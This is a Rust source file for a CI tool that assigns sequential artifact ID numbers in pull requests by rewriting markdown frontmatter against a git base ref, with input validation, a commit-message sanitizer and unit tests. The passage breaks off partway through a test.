//! `forgeplan ci-assign-id` — atomically assign `assigned_number` for new
//! artifacts in a PR per PROB-060 / SPEC-005 / ADR-012.
//!
//! ## Phase 0b prototype scope (binding contract — see Worker 1 prompt)
//!
//! The CI-bot binary part of the EVID-A evidence pack. Wrapped at the
//! `.github/workflows/assign-id.yml` level (Worker 2's owned file) by a
//! `concurrency: forgeplan-id-assign` group that serializes parallel merges.
//! The binary itself is a pure batch job:
//!
//! 1. Walk `--head` for `.forgeplan/**/*.md` artifacts whose frontmatter
//!    carries `slug:` + `assigned_number: null` (Phase 2 lazy-assignment
//!    convention).
//! 2. For each (kind), look up `max(assigned_number)` in `--base` git ref
//!    via [`forgeplan_core::git::max_assigned_number_in_base`] — git-native,
//!    LanceDB-free (ADR-003 invariant + PROB-061 isolation).
//! 3. Mint sequential numbers starting from `max+1`, deterministic order.
//! 4. Detect slug collisions (slug already exists in `--base`) — exit 1
//!    unless `--auto-suffix` is supplied (Phase 0b prototype: warning only;
//!    rename is Phase 2.1's responsibility).
//! 5. Rewrite frontmatter only (no file rename — Phase 2.1 task).
//! 6. Emit either human-readable summary or `--json` per CD-3 schema.
//!
//! ## What this binary deliberately does NOT do (Phase 0b boundaries)
//!
//! - Rename `.md` files (`prd-slug.md` → `PRD-074-slug.md`) — Phase 2.1.
//! - Touch LanceDB (`lance/`) — ADR-003 red-line #8.
//! - Read `change_log` table — PROB-061 isolation.
//! - Run `git commit` / `git push` — workflow YAML wraps and commits.
//! - Network calls — purely local git plumbing.

use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use chrono::Utc;
use forgeplan_core::artifact::frontmatter::{
    assigned_number_from_frontmatter, parse_frontmatter, predicted_number_from_frontmatter,
    set_assigned_number, slug_from_frontmatter,
};
use forgeplan_core::artifact::types::{ArtifactKind, validate_slug};
use forgeplan_core::git::{
    artifact_filenames_in_origin_dev, max_assigned_number_in_base, slug_exists_in_filenames,
    validate_git_ref,
};
use serde::Serialize;

/// Parsed CLI arguments for `ci-assign-id` (Worker 1 owned; main.rs builds
/// this struct via `clap::Parser` derive on the subcommand variant).
#[derive(Debug, Clone)]
pub struct CiAssignIdArgs {
    /// PR number (informational, used in commit message). Required in CI;
    /// defaults to 0 for local/test runs.
    pub pr: u64,
    /// Repo slug `owner/name` (informational). Optional. Default: detect
    /// from `git remote get-url origin`. We do **not** require it — the
    /// binary is repo-agnostic.
    pub repo: Option<String>,
    /// Git ref for "destination" state for `max(assigned_number)` lookup.
    /// Default: `origin/dev`.
    pub base: String,
    /// Git ref for "incoming" PR state. Default: `HEAD`.
    pub head: String,
    /// Workspace root. Default: cwd.
    pub workspace: Option<PathBuf>,
    /// Do not write frontmatter; print what would change.
    pub dry_run: bool,
    /// On slug collision (slug already exists on `--base`), suggest
    /// `<slug>-<assigned_number>` rename. Phase 0b: prototype only — emits
    /// warning to stderr.
    pub auto_suffix: bool,
    /// Emit machine-readable JSON to stdout instead of human-readable.
    pub json: bool,
}

impl Default for CiAssignIdArgs {
    fn default() -> Self {
        Self {
            pr: 0,
            repo: None,
            base: "origin/dev".to_string(),
            head: "HEAD".to_string(),
            workspace: None,
            dry_run: false,
            auto_suffix: false,
            json: false,
        }
    }
}

/// Exit code contract per CD-1.
const EXIT_SUCCESS: i32 = 0;
const EXIT_COLLISION: i32 = 1;
const EXIT_NO_CANDIDATES: i32 = 2;
const EXIT_CONFIG_ERROR: i32 = 3;
#[allow(dead_code)]
const EXIT_INVARIANT_VIOLATION: i32 = 4;

/// JSON output schema version (CD-3).
const JSON_SCHEMA_VERSION: u32 = 1;

/// Per-artifact assignment record (CD-3 `assignments[]` element).
#[derive(Debug, Clone, Serialize)]
pub struct Assignment {
    pub slug: String,
    pub kind: String,
    pub path: String,
    pub predicted_number: Option<u32>,
    pub assigned_number: u32,
    pub max_in_base: Option<u32>,
    /// `assigned`, `skipped_already_assigned`, or `would_assign` (dry-run).
    pub action: String,
}

/// Per-artifact collision record (CD-3 `collisions[]` element).
#[derive(Debug, Clone, Serialize)]
pub struct Collision {
    pub slug: String,
    pub kind: String,
    pub path: String,
    pub conflicts_with_base_path: String,
    pub suggested_resolution: String,
}

/// Summary block (CD-3 `summary`).
#[derive(Debug, Clone, Serialize)]
pub struct Summary {
    pub total_candidates: usize,
    pub assigned: usize,
    pub skipped_already_assigned: usize,
    pub collisions: usize,
    pub exit_code: i32,
}

/// Top-level JSON output (CD-3).
#[derive(Debug, Clone, Serialize)]
pub struct CiAssignIdOutput {
    pub schema_version: u32,
    pub ran_at: String,
    pub pr: u64,
    pub repo: String,
    pub base: String,
    pub head: String,
    pub dry_run: bool,
    pub assignments: Vec<Assignment>,
    pub collisions: Vec<Collision>,
    pub summary: Summary,
    pub commit_message_suggested: String,
}

/// Internal "candidate" — an artifact in `--head` we may need to assign.
#[derive(Debug, Clone)]
pub struct Candidate {
    pub slug: String,
    pub kind: ArtifactKind,
    pub path: PathBuf,
    pub predicted_number: Option<u32>,
    pub current_assigned: Option<u32>,
}

/// Plan element after consultation with `--base`.
#[derive(Debug, Clone)]
pub struct PlanItem {
    pub candidate: Candidate,
    pub assigned_number: u32,
    pub max_in_base: Option<u32>,
    pub already_assigned: bool,
    pub collision: Option<String>, // human-readable suggestion
}

/// Top-level entry point.
///
/// Returns the exit code (caller propagates via `std::process::exit`).
/// All side effects (file writes, stdout/stderr) happen inside.
pub async fn run(args: CiAssignIdArgs) -> Result<i32> {
    // PROB-060 Phase 0b SEC-1 [CWE-88]: validate refs early, before any
    // process spawn. Failures map to CD-1 exit code 3 (config/git error).
    if let Err(e) = validate_git_ref(&args.base) {
        eprintln!("ci-assign-id: invalid --base ref: {e}");
        return Ok(EXIT_CONFIG_ERROR);
    }
    if let Err(e) = validate_git_ref(&args.head) {
        eprintln!("ci-assign-id: invalid --head ref: {e}");
        return Ok(EXIT_CONFIG_ERROR);
    }

    // Resolve workspace root.
    let workspace = match &args.workspace {
        Some(w) => w.clone(),
        None => std::env::current_dir().context("read cwd")?,
    };

    // 1. Discover candidate artifacts.
    let candidates = discover_candidates(&workspace)
        .with_context(|| format!("discovering candidates under {}", workspace.display()))?;

    if candidates.is_empty() {
        let output = CiAssignIdOutput {
            schema_version: JSON_SCHEMA_VERSION,
            ran_at: Utc::now().to_rfc3339(),
            pr: args.pr,
            repo: args.repo.clone().unwrap_or_default(),
            base: args.base.clone(),
            head: args.head.clone(),
            dry_run: args.dry_run,
            assignments: vec![],
            collisions: vec![],
            summary: Summary {
                total_candidates: 0,
                assigned: 0,
                skipped_already_assigned: 0,
                collisions: 0,
                exit_code: EXIT_NO_CANDIDATES,
            },
            commit_message_suggested: String::new(),
        };
        if args.json {
            println!(
                "{}",
                render_json_summary(&output).context("render JSON summary")?
            );
        } else {
            eprintln!(
                "ci-assign-id: no candidate artifacts found in {}",
                args.head
            );
            print!("{}", render_human_summary(&output));
        }
        return Ok(EXIT_NO_CANDIDATES);
    }

    // 2. Compute assignment plan against base.
    let plan = compute_assignment_plan(&workspace, &args.base, &candidates)
        .with_context(|| format!("computing plan against base ref {}", args.base))?;

    // 3. Apply (or simulate if --dry-run).
    let (assignments, collisions) = apply_plan(&workspace, &plan, args.dry_run, args.auto_suffix)
        .context("applying assignment plan")?;

    // 4. Build output.
    let exit_code = if !collisions.is_empty() && !args.auto_suffix {
        EXIT_COLLISION
    } else {
        EXIT_SUCCESS
    };

    let summary = Summary {
        total_candidates: plan.len(),
        assigned: assignments
            .iter()
            .filter(|a| a.action == "assigned" || a.action == "would_assign")
            .count(),
        skipped_already_assigned: assignments
            .iter()
            .filter(|a| a.action == "skipped_already_assigned")
            .count(),
        collisions: collisions.len(),
        exit_code,
    };

    let commit_message_suggested = build_commit_message(args.pr, &assignments);

    let output = CiAssignIdOutput {
        schema_version: JSON_SCHEMA_VERSION,
        ran_at: Utc::now().to_rfc3339(),
        pr: args.pr,
        repo: args.repo.clone().unwrap_or_else(|| detect_repo(&workspace)),
        base: args.base.clone(),
        head: args.head.clone(),
        dry_run: args.dry_run,
        assignments,
        collisions: collisions.clone(),
        summary,
        commit_message_suggested,
    };

    if args.json {
        println!("{}", render_json_summary(&output).context("render JSON")?);
    } else {
        for c in &collisions {
            eprintln!(
                "warning: slug collision: {} ({}) collides with {}; suggested: {}",
                c.slug, c.kind, c.conflicts_with_base_path, c.suggested_resolution
            );
        }
        print!("{}", render_human_summary(&output));
    }

    Ok(exit_code)
}

/// Walk the workspace's `.forgeplan/<kind_dir>/*.md` files; collect those
/// with a parseable frontmatter and a `slug:` field.
///
/// **Idempotency contract (Phase 0b)**: candidates *include* artifacts whose
/// `assigned_number` is already set — but the planner marks them
/// `already_assigned` so [`apply_plan`] emits `skipped_already_assigned`
/// instead of mutating. Re-running the binary on a fully-assigned PR is
/// thus a no-op (exit 0).
pub fn discover_candidates(workspace: &Path) -> Result<Vec<Candidate>> {
    let mut out = Vec::new();
    let all_kinds = [
        ArtifactKind::Prd,
        ArtifactKind::Rfc,
        ArtifactKind::Adr,
        ArtifactKind::Epic,
        ArtifactKind::Spec,
        ArtifactKind::ProblemCard,
        ArtifactKind::SolutionPortfolio,
        ArtifactKind::EvidencePack,
        ArtifactKind::Note,
        ArtifactKind::RefreshReport,
        // ArtifactKind::Memory excluded — memories don't carry assigned_number.
    ];

    for kind in &all_kinds {
        let dir = workspace.join(".forgeplan").join(kind.dir_name());
        if !dir.is_dir() {
            continue;
        }
        for entry in
            std::fs::read_dir(&dir).with_context(|| format!("read_dir {}", dir.display()))?
        {
            let entry = entry?;
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("md") {
                continue;
            }
            // PROB-060 Phase 0b CR-2 fix: propagate I/O errors с `?`. A
            // file that `read_dir` enumerated but `read_to_string` cannot
            // open is a real CI fault (corrupt fs, permission denied,
            // race), not a "silent skip-OK" case.
            let content = std::fs::read_to_string(&path)
                .with_context(|| format!("ci-assign-id: read {}", path.display()))?;
            let (fm, _body) = match parse_frontmatter(&content) {
                Ok(parts) => parts,
                Err(e) => {
                    // PROB-060 Phase 0b CR-2 fix: surface parse failures
                    // instead of silently skipping. Continue с remaining
                    // candidates so one bad file doesn't block CI.
                    eprintln!(
                        "ci-assign-id: skipping {}: frontmatter parse failed: {e}",
                        path.display()
                    );
                    continue;
                }
            };
            let slug = match slug_from_frontmatter(&fm) {
                Some(s) => s.to_string(),
                None => continue,
            };
            // PROB-060 Phase 0b SEC-2 [CWE-94] Part B: re-validate slug
            // here, on the read path. The frontmatter is PR-controlled
            // YAML и flows downstream into commit messages, JSON output,
            // и `git commit -m` arguments. validate_slug is the single
            // source of truth для SPEC-005 slug shape; an invalid slug
            // here means the frontmatter has been tampered with или the
            // author skipped `forgeplan new`. Fail loudly rather than
            // letting bogus content reach commit-msg interpolation.
            if let Err(e) = validate_slug(&slug) {
                anyhow::bail!(
                    "ci-assign-id: malformed slug {slug:?} in {}: {e}",
                    path.display()
                );
            }
            let predicted = predicted_number_from_frontmatter(&fm);
            let current_assigned = assigned_number_from_frontmatter(&fm);
            out.push(Candidate {
                slug,
                kind: kind.clone(),
                path,
                predicted_number: predicted,
                current_assigned,
            });
        }
    }

    out.sort_by(|a, b| a.path.cmp(&b.path));
    Ok(out)
}

/// Convert candidates → plan items with assigned numbers.
pub fn compute_assignment_plan(
    workspace: &Path,
    base_ref: &str,
    candidates: &[Candidate],
) -> Result<Vec<PlanItem>> {
    use std::collections::HashMap;

    let mut by_kind: HashMap<String, Vec<Candidate>> = HashMap::new();
    for c in candidates {
        by_kind
            .entry(c.kind.dir_name().to_string())
            .or_default()
            .push(c.clone());
    }

    let mut output: Vec<PlanItem> = Vec::with_capacity(candidates.len());
    let mut seq_per_kind: HashMap<String, u32> = HashMap::new();
    let mut max_per_kind: HashMap<String, Option<u32>> = HashMap::new();
    let mut base_files_per_kind: HashMap<String, Vec<String>> = HashMap::new();

    for kind_dir in by_kind.keys() {
        let kind = match dir_name_to_kind(kind_dir) {
            Some(k) => k,
            None => continue,
        };
        let max_in_base = max_assigned_number_in_base(workspace, base_ref, &kind)?;
        max_per_kind.insert(kind_dir.clone(), max_in_base);
        seq_per_kind.insert(kind_dir.clone(), max_in_base.unwrap_or(0));
        let files = artifact_filenames_in_origin_dev(workspace, kind_dir);
        base_files_per_kind.insert(kind_dir.clone(), files);
    }

    for c in candidates {
        let kind_dir = c.kind.dir_name().to_string();
        let max_in_base = max_per_kind.get(&kind_dir).cloned().flatten();
        let base_files = base_files_per_kind
            .get(&kind_dir)
            .cloned()
            .unwrap_or_default();

        if let Some(existing) = c.current_assigned {
            // PROB-060 Phase 0b CR-1 fix: when a candidate is already
            // assigned (workflow retry, partial-assignment state), the
            // per-kind sequence counter must absorb its number — otherwise
            // на retry мы бы выдали `max_in_base + 1` коллидируя с уже
            // присвоенным номером. Doc promised idempotency; this seals
            // the leak.
            let entry = seq_per_kind.entry(kind_dir.clone()).or_insert(0);
            *entry = (*entry).max(existing);
            output.push(PlanItem {
                candidate: c.clone(),
                assigned_number: existing,
                max_in_base,
                already_assigned: true,
                collision: None,
            });
            continue;
        }

        let seq = seq_per_kind.entry(kind_dir.clone()).or_insert(0);
        *seq += 1;
        let assigned_number = *seq;

        let collision = if slug_exists_in_filenames(&c.slug, &base_files) {
            Some(format!("{}-{}", c.slug, assigned_number))
        } else {
            None
        };

        output.push(PlanItem {
            candidate: c.clone(),
            assigned_number,
            max_in_base,
            already_assigned: false,
            collision,
        });
    }

    Ok(output)
}

/// Apply the plan: rewrite frontmatter, return assignment + collision lists.
pub fn apply_plan(
    _workspace: &Path,
    plan: &[PlanItem],
    dry_run: bool,
    auto_suffix: bool,
) -> Result<(Vec<Assignment>, Vec<Collision>)> {
    let mut assignments = Vec::new();
    let mut collisions = Vec::new();

    for item in plan {
        let kind_template_key = item.candidate.kind.template_key().to_string();
        let path_str = item.candidate.path.to_string_lossy().into_owned();

        if let Some(suggested) = &item.collision {
            collisions.push(Collision {
                slug: item.candidate.slug.clone(),
                kind: kind_template_key.clone(),
                path: path_str.clone(),
                conflicts_with_base_path: format!(
                    ".forgeplan/{}/{}.md",
                    item.candidate.kind.dir_name(),
                    item.candidate.slug
                ),
                suggested_resolution: suggested.clone(),
            });
            // Phase 0b prototype: do NOT perform the rename even with
            // --auto-suffix. Worker 1 prompt: "warning only".
            let _ = auto_suffix;
            continue;
        }

        if item.already_assigned {
            assignments.push(Assignment {
                slug: item.candidate.slug.clone(),
                kind: kind_template_key,
                path: path_str,
                predicted_number: item.candidate.predicted_number,
                assigned_number: item.assigned_number,
                max_in_base: item.max_in_base,
                action: "skipped_already_assigned".to_string(),
            });
            continue;
        }

        if !dry_run {
            let content = std::fs::read_to_string(&item.candidate.path).with_context(|| {
                format!(
                    "ci-assign-id: read {} for assigned_number rewrite",
                    item.candidate.path.display()
                )
            })?;
            let new_content =
                set_assigned_number(&content, item.assigned_number).with_context(|| {
                    format!(
                        "ci-assign-id: set_assigned_number on {} to {}",
                        item.candidate.path.display(),
                        item.assigned_number
                    )
                })?;
            std::fs::write(&item.candidate.path, new_content).with_context(|| {
                format!("ci-assign-id: write {}", item.candidate.path.display())
            })?;
        }

        assignments.push(Assignment {
            slug: item.candidate.slug.clone(),
            kind: kind_template_key,
            path: path_str,
            predicted_number: item.candidate.predicted_number,
            assigned_number: item.assigned_number,
            max_in_base: item.max_in_base,
            action: if dry_run {
                "would_assign".to_string()
            } else {
                "assigned".to_string()
            },
        });
    }

    Ok((assignments, collisions))
}

/// Render the human-readable summary table.
pub fn render_human_summary(out: &CiAssignIdOutput) -> String {
    let mut s = String::new();
    s.push_str(&format!(
        "ci-assign-id (PR #{}, base={}, head={}{})\n",
        out.pr,
        out.base,
        out.head,
        if out.dry_run { ", dry-run" } else { "" }
    ));
    if out.summary.total_candidates == 0 {
        s.push_str("  No candidate artifacts found.\n");
        return s;
    }
    for a in &out.assignments {
        s.push_str(&format!(
            "  [{}] {} ({}): {}\n",
            a.action,
            display_id(&a.kind, a.assigned_number),
            a.slug,
            a.path,
        ));
    }
    if !out.collisions.is_empty() {
        s.push_str("Collisions:\n");
        for c in &out.collisions {
            s.push_str(&format!(
                "  {} ({}) ↔ {}; suggested: {}\n",
                c.slug, c.kind, c.conflicts_with_base_path, c.suggested_resolution
            ));
        }
    }
    s.push_str(&format!(
        "Summary: {} candidates, {} assigned, {} skipped, {} collisions (exit {})\n",
        out.summary.total_candidates,
        out.summary.assigned,
        out.summary.skipped_already_assigned,
        out.summary.collisions,
        out.summary.exit_code
    ));
    s
}

/// Render the JSON summary per CD-3.
pub fn render_json_summary(out: &CiAssignIdOutput) -> Result<String> {
    serde_json::to_string_pretty(out).context("serialize CiAssignIdOutput as JSON")
}

/// Format a display id like `PRD-074` from kind + assigned number.
///
/// PROB-060 Phase 0b CR-6 fix: `template_key().to_uppercase()` produced
/// `PROBLEM-060` / `SOLUTION-001` / `EVIDENCE-114` / `REFRESH-001` —
/// not the canonical project IDs (`PROB-060`, `SOL-001`, `EVID-114`,
/// `REF-001`). Map explicitly so commit messages, JSON output, и
/// human-readable summaries all agree с the rest of the system. Unknown
/// template keys fall back to `to_uppercase()` for forward-compatibility.
fn display_id(kind_template_key: &str, n: u32) -> String {
    let prefix = match kind_template_key {
        "prd" => "PRD",
        "rfc" => "RFC",
        "adr" => "ADR",
        "epic" => "EPIC",
        "spec" => "SPEC",
        "problem" => "PROB",
        "solution" => "SOL",
        "evidence" => "EVID",
        "note" => "NOTE",
        "refresh" => "REF",
        "memory" => "MEM",
        // Defensive fallback for any future kind не yet mapped above.
        other => return format!("{}-{:03}", other.to_uppercase(), n),
    };
    format!("{prefix}-{n:03}")
}

/// Sanitize a string for safe inclusion in a `git commit -m "<msg>"`
/// argument body (PROB-060 Phase 0b SEC-2 [CWE-94] Part C — defense in
/// depth).
///
/// Phase 0b workflow YAML uses an env-var pass для commit_msg, neutralizing
/// the `${{ }}` interpolation attack vector. This sanitizer is the
/// belt-and-suspenders second line: even если a future workflow refactor
/// reintroduces direct shell interpolation, или a downstream tool reads
/// `commit_message_suggested` field из JSON и feeds it to a shell, control
/// chars и shell metacharacters are already stripped. Slug shape
/// (`[a-z0-9-]+`) per SPEC-005 is the upper bound; we replace any char
/// outside `[A-Za-z0-9_./-]` с `_`. Note `.` и `_` allowed for tag-like
/// version refs but `'`, `"`, `` ` ``, `$`, `\\`, `;`, `|`, newline, etc.
/// always stripped.
fn sanitize_for_commit_msg(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '/' | '-') {
                c
            } else {
                '_'
            }
        })
        .collect()
}

/// Build the suggested commit message body per CD-1.
///
/// PROB-060 Phase 0b SEC-2 [CWE-94] Part C: every interpolated value
/// flows through [`sanitize_for_commit_msg`] before being concatenated
/// into the commit body. Even though the workflow YAML neutralizes
/// shell interpolation with an env-var pass, slugs могут carry control
/// chars (newlines breaking `git commit -m` quoting) или shell
/// metacharacters that confuse downstream tooling reading the JSON.
fn build_commit_message(pr: u64, assignments: &[Assignment]) -> String {
    if assignments.is_empty() {
        return String::new();
    }
    let mut listed: Vec<String> = Vec::new();
    for a in assignments {
        if a.action == "assigned" || a.action == "would_assign" {
            // display_id is always safe (mapped enum + integer).
            // Slug is PR-controlled YAML — sanitize before interpolation.
            listed.push(format!(
                "{} ({})",
                display_id(&a.kind, a.assigned_number),
                sanitize_for_commit_msg(&a.slug)
            ));
        }
    }
    if listed.is_empty() {
        return String::new();
    }
    format!(
        "chore(ci): assign artifact IDs for PR #{}\n\nAssigned: {}\n\nRefs: PROB-060, PRD-076, RFC-009 §Phase 0b",
        pr,
        listed.join(", ")
    )
}

/// Best-effort `owner/name` detection from `git remote get-url origin`.
fn detect_repo(workspace: &Path) -> String {
    let output = std::process::Command::new("git")
        .args(["remote", "get-url", "origin"])
        .current_dir(workspace)
        .output();
    match output {
        Ok(o) if o.status.success() => {
            let url = String::from_utf8_lossy(&o.stdout).trim().to_string();
            let url = url.trim_end_matches(".git").to_string();
            if let Some(idx) = url.rfind(':') {
                let tail = &url[idx + 1..];
                if tail.contains('/') {
                    return tail.to_string();
                }
            }
            if let Some(idx) = url.find("://") {
                let after = &url[idx + 3..];
                let parts: Vec<&str> = after.splitn(2, '/').collect();
                if parts.len() == 2 {
                    return parts[1].to_string();
                }
            }
            url
        }
        _ => String::new(),
    }
}

/// Reverse mapping `dir_name` (e.g. "prds") → ArtifactKind.
fn dir_name_to_kind(dir: &str) -> Option<ArtifactKind> {
    match dir {
        "prds" => Some(ArtifactKind::Prd),
        "rfcs" => Some(ArtifactKind::Rfc),
        "adrs" => Some(ArtifactKind::Adr),
        "epics" => Some(ArtifactKind::Epic),
        "specs" => Some(ArtifactKind::Spec),
        "problems" => Some(ArtifactKind::ProblemCard),
        "solutions" => Some(ArtifactKind::SolutionPortfolio),
        "evidence" => Some(ArtifactKind::EvidencePack),
        "notes" => Some(ArtifactKind::Note),
        "refresh" => Some(ArtifactKind::RefreshReport),
        "memory" => Some(ArtifactKind::Memory),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    /// Build a minimal workspace tree with the given (rel_path, content) pairs.
    fn make_ws(files: &[(&str, &str)]) -> TempDir {
        let tmp = TempDir::new().unwrap();
        for (rel, content) in files {
            let p = tmp.path().join(rel);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(&p, content).unwrap();
        }
        tmp
    }

    fn artifact(slug: &str, predicted: u32, assigned: Option<&str>) -> String {
        let assigned_line = match assigned {
            Some(s) => format!("assigned_number: {s}\n"),
            None => "assigned_number: null\n".to_string(),
        };
        format!(
            "---\nslug: {slug}\npredicted_number: {predicted}\n{assigned_line}status: draft\n---\n\nbody\n"
        )
    }

    #[test]
    fn discover_candidates_empty_workspace() {
        let tmp = make_ws(&[]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert!(out.is_empty());
    }

    #[test]
    fn discover_candidates_single_artifact() {
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-auth-system.md",
            &artifact("prd-auth-system", 74, None),
        )]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].slug, "prd-auth-system");
        assert_eq!(out[0].kind, ArtifactKind::Prd);
        assert_eq!(out[0].predicted_number, Some(74));
        assert_eq!(out[0].current_assigned, None);
    }

    #[test]
    fn discover_candidates_skips_files_without_slug() {
        let tmp = make_ws(&[
            (
                ".forgeplan/prds/legacy.md",
                "---\nid: PRD-018\nstatus: active\n---\n\n",
            ),
            (".forgeplan/prds/new.md", &artifact("prd-new", 80, None)),
        ]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].slug, "prd-new");
    }

    #[test]
    fn discover_candidates_includes_already_assigned() {
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-x.md",
            &artifact("prd-x", 74, Some("74")),
        )]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].current_assigned, Some(74));
    }

    #[test]
    fn discover_candidates_stable_order() {
        let tmp = make_ws(&[
            (".forgeplan/prds/prd-b.md", &artifact("prd-b", 74, None)),
            (".forgeplan/prds/prd-a.md", &artifact("prd-a", 75, None)),
        ]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 2);
        assert_eq!(out[0].slug, "prd-a");
        assert_eq!(out[1].slug, "prd-b");
    }

    /// Init a git repo with files committed on `dev` (helper).
    fn init_git_with_files(files: &[(&str, &str)]) -> TempDir {
        use std::process::Command;
        let tmp = TempDir::new().unwrap();
        let work = tmp.path();
        Command::new("git")
            .args(["init", "--quiet", "--initial-branch=dev"])
            .current_dir(work)
            .status()
            .unwrap();
        for (k, v) in [("user.email", "test@local"), ("user.name", "Test")] {
            Command::new("git")
                .args(["config", k, v])
                .current_dir(work)
                .status()
                .ok();
        }
        fs::write(work.join(".gitkeep"), "").unwrap();
        for (rel, content) in files {
            let p = work.join(rel);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(p, content).unwrap();
        }
        Command::new("git")
            .args(["add", "."])
            .current_dir(work)
            .status()
            .unwrap();
        Command::new("git")
            .args(["commit", "--quiet", "-m", "fix"])
            .current_dir(work)
            .status()
            .unwrap();
        tmp
    }

    #[test]
    fn compute_plan_assigns_sequential_starting_from_max_plus_one() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        let candidates = vec![
            Candidate {
                slug: "prd-new-a".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-a.md"),
                predicted_number: Some(74),
                current_assigned: None,
            },
            Candidate {
                slug: "prd-new-b".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-b.md"),
                predicted_number: Some(75),
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 2);
        assert_eq!(plan[0].assigned_number, 74);
        assert_eq!(plan[1].assigned_number, 75);
        assert_eq!(plan[0].max_in_base, Some(73));
    }

    #[test]
    fn compute_plan_idempotent_for_already_assigned() {
        let tmp = init_git_with_files(&[]);
        let candidates = vec![Candidate {
            slug: "prd-x".to_string(),
            kind: ArtifactKind::Prd,
            path: tmp.path().join("prd-x.md"),
            predicted_number: Some(74),
            current_assigned: Some(74),
        }];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 1);
        assert_eq!(plan[0].assigned_number, 74);
        assert!(plan[0].already_assigned);
    }

    #[test]
    fn compute_plan_starts_at_one_when_base_empty() {
        let tmp = init_git_with_files(&[]);
        let candidates = vec![Candidate {
            slug: "prd-first".to_string(),
            kind: ArtifactKind::Prd,
            path: tmp.path().join(".forgeplan/prds/prd-first.md"),
            predicted_number: Some(1),
            current_assigned: None,
        }];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 1);
        assert_eq!(plan[0].assigned_number, 1);
        assert_eq!(plan[0].max_in_base, None);
    }

    #[test]
    fn compute_plan_per_kind_independent_sequences() {
        let tmp = init_git_with_files(&[
            (
                ".forgeplan/prds/prd-existing.md",
                &artifact("prd-existing", 73, Some("73")),
            ),
            (
                ".forgeplan/rfcs/rfc-existing.md",
                &artifact("rfc-existing", 8, Some("8")),
            ),
        ]);
        let candidates = vec![
            Candidate {
                slug: "prd-new".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new.md"),
                predicted_number: Some(74),
                current_assigned: None,
            },
            Candidate {
                slug: "rfc-new".to_string(),
                kind: ArtifactKind::Rfc,
                path: tmp.path().join(".forgeplan/rfcs/rfc-new.md"),
                predicted_number: Some(9),
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        let prd_item = plan.iter().find(|p| p.candidate.slug == "prd-new").unwrap();
        let rfc_item = plan.iter().find(|p| p.candidate.slug == "rfc-new").unwrap();
        assert_eq!(prd_item.assigned_number, 74);
        assert_eq!(rfc_item.assigned_number, 9);
    }

    #[test]
    fn apply_plan_writes_frontmatter_when_not_dry_run() {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("prd-x.md");
        fs::write(&path, artifact("prd-x", 74, None)).unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false, false).unwrap();
        assert!(collisions.is_empty());
        assert_eq!(assignments.len(), 1);
        assert_eq!(assignments[0].action, "assigned");
        let updated = fs::read_to_string(&path).unwrap();
        assert!(updated.contains("assigned_number: 74"));
    }

    #[test]
    fn apply_plan_dry_run_does_not_mutate_file() {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("prd-x.md");
        let original = artifact("prd-x", 74, None);
        fs::write(&path, &original).unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, _) = apply_plan(tmp.path(), &plan, true, false).unwrap();
        assert_eq!(assignments[0].action, "would_assign");
        let after = fs::read_to_string(&path).unwrap();
        assert_eq!(after, original, "dry-run must not modify file");
    }

    #[test]
    fn apply_plan_already_assigned_emits_skipped() {
        let tmp = TempDir::new().unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join("prd-x.md"),
                predicted_number: Some(74),
                current_assigned: Some(74),
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: true,
            collision: None,
        }];
        let (assignments, _) = apply_plan(tmp.path(), &plan, false, false).unwrap();
        assert_eq!(assignments[0].action, "skipped_already_assigned");
    }

    #[test]
    fn apply_plan_collision_recorded_without_auto_suffix() {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("prd-conflict.md");
        fs::write(&path, artifact("prd-conflict", 74, None)).unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-conflict".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
